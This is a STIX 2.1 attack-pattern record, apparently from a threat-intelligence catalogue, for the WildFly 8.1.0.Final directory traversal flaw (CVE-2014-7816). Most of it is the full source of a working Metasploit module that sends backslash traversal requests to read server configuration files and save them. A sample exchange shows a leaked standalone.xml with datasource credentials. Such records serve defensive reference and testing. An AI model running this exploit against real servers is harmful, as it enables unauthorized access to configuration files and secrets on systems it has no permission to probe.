{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3c30e4b0-514c-434c-a7ad-01b4ec8d0e73",
    "created": "2024-08-14T16:31:12.134993Z",
    "modified": "2024-08-14T16:31:12.134997Z",
    "name": "WildFly Directory Traversal",
    "description": " This module exploits a directory traversal vulnerability found in the WildFly 8.1.0.Final web server running on port 8080, named JBoss Undertow. The vulnerability only affects to Windows systems.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/wildfly_traversal.rb",
            "external_id": "wildfly_traversal.rb"
        },
        {
            "source_name": "reference",
            "url": "https://access.redhat.com/security/cve/CVE-2014-7816"
        },
        {
            "source_name": "reference",
            "url": "https://www.conviso.com.br/advisories/CONVISO-14-001.txt"
        },
        {
            "source_name": "reference",
            "url": "https://www.openwall.com/lists/oss-security/2014/11/27/4"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WildFly Directory Traversal',\n      'Description'    => %q{\n        This module exploits a directory traversal vulnerability found in the WildFly 8.1.0.Final\n        web server running on port 8080, named JBoss Undertow. The vulnerability only affects to\n        Windows systems.\n      },\n      'References'     =>\n        [\n          ['CVE', '2014-7816' ],\n          ['URL', 'https://access.redhat.com/security/cve/CVE-2014-7816'],\n          ['URL', 'https://www.conviso.com.br/advisories/CONVISO-14-001.txt'],\n          ['URL', 'https://www.openwall.com/lists/oss-security/2014/11/27/4']\n        ],\n      'Author'         => 'Roberto Soares Espreto <robertoespreto[at]gmail.com>',\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2014-10-22'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('RELATIVE_FILE_PATH', [true, 'Relative path to the file to read', 'standalone\\\\configuration\\\\standalone.xml']),\n        OptInt.new('TRAVERSAL_DEPTH', [true, 'Traversal depth', 1])\n      ])\n  end\n\n  def run_host(ip)\n    vprint_status(\"Attempting to download: #{datastore['RELATIVE_FILE_PATH']}\")\n\n    traversal = \"..\\\\\" * datastore['TRAVERSAL_DEPTH']\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri'    => \"/#{traversal}\\\\#{datastore['RELATIVE_FILE_PATH']}\"\n    })\n\n    if res &&\n        res.code == 200 &&\n        res.headers['Server'] &&\n        res.headers['Server'] =~ /WildFly/\n      vprint_line(res.to_s)\n      fname = File.basename(datastore['RELATIVE_FILE_PATH'])\n\n      path = store_loot(\n        'wildfly.http',\n        'application/octet-stream',\n        ip,\n        res.body,\n        fname\n      )\n      print_good(\"File saved in: #{path}\")\n    else\n      vprint_error(\"Nothing was downloaded\")\n    end\n  end\nend\n\n=begin\nGET /..\\\\standalone\\\\configuration\\\\standalone.xml HTTP/1.1\nUser-Agent: curl/7.38.0\nHost: 127.0.0.1:8080\nAccept: */*\n\nHTTP/1.1 200 OK\nConnection: keep-alive\nLast-Modified: Wed, 22 Oct 2014 14:37:28 GMT\nX-Powered-By: Undertow/1\nServer: WildFly/8\nContent-Type: text/xml\nContent-Length: 19697\nDate: Wed, 22 Oct 2014 16:32:08 GMT\n\n<?xml version='1.0' encoding='UTF-8'?>\n\n<server xmlns=\"urn:jboss:domain:2.1\">\n<extensions>\n<extension module=\"org.jboss.as.clustering.infinispan\"/>\n...snip...\n<subsystem xmlns=\"urn:jboss:domain:datasources:2.0\">\n<datasources>\n<datasource jndi-name=\"java:jboss/datasources/ExampleDS\" pool-name=\"ExampleDS\" enabled=\"true\" use-java-context=\"true\">\n<connection-url>jdbc:h2:mem:test;DB_CLOSE_DELAY=-1;DB_CLOSE_ON_EXIT=FALSE</connection-url>\n<driver>h2</driver>\n<security>\n<user-name>sa</user-name>\n<password>sa</password>\n</security>\n</datasource>\n<drivers>\n<driver name=\"h2\" module=\"com.h2database.h2\">\n<xa-datasource-class>org.h2.jdbcx.JdbcDataSource</xa-datasource-class>\n...snip...\n=end\n",
    "x_mitre_contributors": [
        "Roberto Soares Espreto <robertoespreto[at]gmail.com>",
        ""
    ],
    "x_mitre_disclosure_date": "2014-10-22"
}